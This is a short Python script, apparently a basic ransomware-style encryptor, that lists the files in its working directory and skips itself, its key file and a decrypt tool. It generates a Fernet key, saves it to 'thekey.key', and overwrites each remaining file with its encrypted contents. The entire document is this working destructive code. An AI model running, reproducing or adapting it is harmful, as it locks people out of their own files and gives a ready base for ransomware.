import os
from cryptography.fernet import Fernet
files = []
my_files = os.listdir()
for file in range(len(my_files)):
    if my_files[file] == "goblinscript.py" or my_files[file] == "thekey.key" or my_files[file] =="decrypt_tool.py":
        continue
    if os.path.isfile(my_files[file]):
        files.append(my_files[file])
print(files)
key = Fernet.generate_key()
with open("thekey.key", "wb") as my_key:
    my_key.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


